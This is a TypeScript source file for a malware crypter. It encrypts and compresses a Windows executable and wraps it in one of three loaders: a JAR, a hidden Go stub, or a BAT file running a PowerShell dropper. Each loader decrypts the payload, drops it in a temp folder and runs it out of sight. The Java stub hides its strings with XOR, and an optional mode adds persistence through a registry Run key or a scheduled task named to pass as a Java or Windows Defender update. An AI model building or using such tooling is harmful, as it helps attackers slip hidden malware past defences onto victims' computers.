import zlib from "zlib";
import fs from "fs";
import path from "path";
import { $ } from "bun";
import { v4 as uuidv4 } from "uuid";

export interface CryptOpts {
  dualHooked: boolean;
}

// ── Helpers ───────────────────────────────────────────────────────────────────

function xorBuf(data: Buffer, key: number): Buffer {
  const out = Buffer.allocUnsafe(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ key;
  return out;
}

/** Encode a string as a Java int[] literal XOR'd with key=90.
 *  Decoded at runtime with: private static String x(int[]a){...} */
function xs(s: string): string {
  const ints = Array.from(Buffer.from(s, "utf-8")).map((b) => (b ^ 90) & 0xff);
  return `new int[]{${ints.join(",")}}`;
}

function randKey(): number {
  return (Math.floor(Math.random() * 254) + 1) & 0xff;
}

// ── EXE → JAR ─────────────────────────────────────────────────────────────────

export async function cryptToJar(
  exe: Buffer,
  out: string,
  opts: CryptOpts
): Promise<void> {
  const gz = zlib.gzipSync(exe, { level: 9 });
  const key = randKey();
  // .pak format: [key byte][xor-encrypted gzip data]
  const pak = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);

  const src = buildJarSource(opts);
  const tmp = fs.mkdtempSync("/tmp/cjar-");

  try {
    const classDir = path.join(tmp, "cls");
    const assetDir = path.join(classDir, "assets");
    const metaDir = path.join(classDir, "META-INF");
    fs.mkdirSync(assetDir, { recursive: true });
    fs.mkdirSync(metaDir, { recursive: true });

    const srcFile = path.join(tmp, "Main.java");
    fs.writeFileSync(srcFile, src);

    const javac = await $`javac -source 8 -target 8 -d ${classDir} ${srcFile}`
      .nothrow()
      .quiet();
    if (javac.exitCode !== 0)
      throw new Error(`javac: ${javac.stderr.toString().trim()}`);

    fs.writeFileSync(path.join(assetDir, "data.pak"), pak);
    const mfPath = path.join(metaDir, "MANIFEST.MF");
    fs.writeFileSync(mfPath, "Manifest-Version: 1.0\nMain-Class: Main\n\n");

    const jar = await $`jar cfm ${out} ${mfPath} -C ${classDir} .`
      .nothrow()
      .quiet();
    if (jar.exitCode !== 0)
      throw new Error(`jar: ${jar.stderr.toString().trim()}`);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

function buildJarSource(opts: CryptOpts): string {
  const lines: string[] = [
    "import java.io.*;",
    "import java.util.*;",
    "import java.util.zip.*;",
    "public class Main{",
    "  private static final java.util.concurrent.atomic.AtomicBoolean G=new java.util.concurrent.atomic.AtomicBoolean(false);",
    // XOR decode helper (key=90)
    `  private static String x(int[]a){byte[]b=new byte[a.length];for(int i=0;i<a.length;i++)b[i]=(byte)(a[i]^90);try{return new String(b,"UTF-8");}catch(Exception e){return "";}}`,
  ];

  // Dual-hooked: fire from static initializer AND main()
  if (opts.dualHooked) {
    lines.push("  static{try{r();}catch(Exception e){}}");
  }

  lines.push(
    "  public static void main(String[]a){try{r();}catch(Exception e){}}",
    "  private static void r()throws Exception{",
    "    if(!G.compareAndSet(false,true))return;",
    "    Thread.sleep(500+new Random().nextInt(1500));",
    // Load encrypted payload from JAR resources
    `    InputStream is=Main.class.getResourceAsStream(x(${xs("/assets/data.pak")}));`,
    "    if(is==null)return;",
    "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
    "    byte[]tmp=new byte[4096];int n;",
    "    while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);is.close();",
    "    byte[]raw=buf.toByteArray();",
    // Decrypt: first byte is XOR key
    "    int key=raw[0]&0xFF;",
    "    byte[]xd=new byte[raw.length-1];",
    "    for(int i=0;i<xd.length;i++)xd[i]=(byte)(raw[i+1]^key);",
    // Decompress gzip
    "    GZIPInputStream gz=new GZIPInputStream(new ByteArrayInputStream(xd));",
    "    ByteArrayOutputStream ob=new ByteArrayOutputStream();",
    "    byte[]tmp2=new byte[4096];int n2;",
    "    while((n2=gz.read(tmp2))!=-1)ob.write(tmp2,0,n2);gz.close();",
    "    byte[]data=ob.toByteArray();"
  );

  if (opts.dualHooked) {
    // Dual-hooked: copy to AppData for persistence before first run
    lines.push(
      "    try{",
      `      String ad=System.getenv(x(${xs("APPDATA")}));`,
      "      if(ad!=null){",
      `        File pf=new File(ad+File.separator+x(${xs("JavaUpdate.exe")}));`,
      "        try(FileOutputStream pfos=new FileOutputStream(pf)){pfos.write(data);}",
      "        pf.setExecutable(true);",
      // Registry Run key for HKCU persistence
      `        new ProcessBuilder(x(${xs("reg")}),x(${xs("add")}),x(${xs("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")}),x(${xs("/v")}),x(${xs("JavaUpdate")}),x(${xs("/d")}),pf.getAbsolutePath(),x(${xs("/f")})).start();`,
      "      }",
      "    }catch(Exception ignored){}",
    );
  }

  lines.push(
    // Write decrypted exe to temp and launch
    `    File tf=File.createTempFile(x(${xs("svc")}),x(${xs(".exe")}));`,
    "    tf.deleteOnExit();",
    "    try(FileOutputStream fos=new FileOutputStream(tf)){fos.write(data);}",
    "    tf.setExecutable(true);",
    // cmd /c start "" runs it detached, hidden from taskbar
    `    new ProcessBuilder(x(${xs("cmd.exe")}),x(${xs("/c")}),x(${xs("start")}),x(${xs("")}),tf.getAbsolutePath()).start();`,
    "  }",
    "}"
  );

  return lines.join("\n");
}

// ── EXE → EXE (Go stub compiled for Windows) ─────────────────────────────────

export async function cryptToExe(
  exe: Buffer,
  out: string,
  opts: CryptOpts
): Promise<void> {
  const gz = zlib.gzipSync(exe, { level: 9 });
  const key = randKey();
  const enc = xorBuf(gz, key);

  const encArr = Array.from(enc)
    .map((b) => `0x${b.toString(16).padStart(2, "0")}`)
    .join(", ");
  const keyHex = `0x${key.toString(16).padStart(2, "0")}`;

  const dualCode = opts.dualHooked
    ? `\t// Dual hook: persist via HKCU Run registry key
\texec.Command("reg", "add",
\t\t`+"`HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run`"+`,
\t\t"/v", "WindowsDefenderUpdate",
\t\t"/d", name, "/f").Start()`
    : "";

  const goSrc = `package main

import (
\t"bytes"
\t"compress/gzip"
\t"io"
\t"os"
\t"os/exec"
\t"syscall"
)

// Encrypted payload: gzip compressed then XOR'd
var enc = []byte{${encArr}}

const xorKey byte = ${keyHex}

func main() {
\t// XOR decrypt
\tdec := make([]byte, len(enc))
\tfor i, b := range enc {
\t\tdec[i] = b ^ xorKey
\t}
\t// Gzip decompress
\tgr, err := gzip.NewReader(bytes.NewReader(dec))
\tif err != nil {
\t\treturn
\t}
\tvar buf bytes.Buffer
\tio.Copy(&buf, gr)
\tgr.Close()
\tdata := buf.Bytes()
\t// Write to temp file
\tf, err := os.CreateTemp("", "*.exe")
\tif err != nil {
\t\treturn
\t}
\tname := f.Name()
\tf.Write(data)
\tf.Close()
\t// Execute hidden (no console window)
\tcmd := exec.Command(name)
\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
\tcmd.Start()
${dualCode}
}
`;

  const tmpDir = fs.mkdtempSync("/tmp/cexe-");
  try {
    fs.writeFileSync(path.join(tmpDir, "main.go"), goSrc);

    const env = {
      ...process.env,
      GOOS: "windows",
      GOARCH: "amd64",
      GOAMD64: "v1",
      CGO_ENABLED: "0",
    };

    const init = await $`go mod init loader`
      .cwd(tmpDir)
      .env(env)
      .nothrow()
      .quiet();
    if (init.exitCode !== 0)
      throw new Error(`go mod init: ${init.stderr.toString().trim()}`);

    const build = await $`go build -ldflags="-s -w -H=windowsgui" -trimpath -o ${out} .`
      .cwd(tmpDir)
      .env(env)
      .nothrow()
      .quiet();
    if (build.exitCode !== 0)
      throw new Error(`go build: ${build.stderr.toString().trim()}`);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

// ── EXE → BAT (PowerShell dropper self-contained in .bat) ────────────────────

export async function cryptToBat(
  exe: Buffer,
  out: string,
  opts: CryptOpts
): Promise<void> {
  const gz = zlib.gzipSync(exe, { level: 9 });
  const key = randKey();
  const enc = xorBuf(gz, key);
  const b64 = enc.toString("base64");
  // Split into 76-char lines so the marker search stays fast
  const b64Lines = (b64.match(/.{1,76}/g) ?? [b64]).join("\n");

  // Unique marker embedded as a BAT label (never executed — we exit /b 0 before it)
  const marker = `:PAYLOAD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;

  const dualHookPs = opts.dualHooked
    ? [
        `$a=New-ScheduledTaskAction -Execute $t;`,
        `$tr=New-ScheduledTaskTrigger -AtLogOn;`,
        `Register-ScheduledTask -Force -TaskName 'WindowsDefenderUpdate' -Action $a -Trigger $tr -RunLevel Highest 2>$null;`,
      ].join("")
    : "";

  // PowerShell inline: reads THIS bat file to extract payload after the marker
  const psCmd = [
    `$k=${key};`,
    `$l=[IO.File]::ReadAllLines($env:_SELF);`,
    // Find marker line, grab everything after it as base64
    `$i=0;for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
    `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)] -join ''));`,
    // XOR decrypt
    `$d=New-Object byte[] $b.Length;`,
    `for($x=0;$x-lt$b.Length;$x++){$d[$x]=$b[$x] -bxor $k};`,
    // Gzip decompress
    `$ms=New-Object IO.MemoryStream(,$d);`,
    `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);`,
    `$os=New-Object IO.MemoryStream;$gs.CopyTo($os);$gs.Close();`,
    // Write + run
    `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
    `[IO.File]::WriteAllBytes($t,$os.ToArray());`,
    dualHookPs,
    `Start-Process $t;`,
  ].join("");

  const bat = [
    "@echo off",
    "setlocal",
    `set "_SELF=%~f0"`,
    // Single-line PS command reads env:_SELF to locate payload in this file
    `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
    "endlocal",
    "exit /b 0",
    // --- payload data below (never executed by BAT) ---
    marker,
    b64Lines,
  ].join("\r\n");

  fs.writeFileSync(out, bat);
}
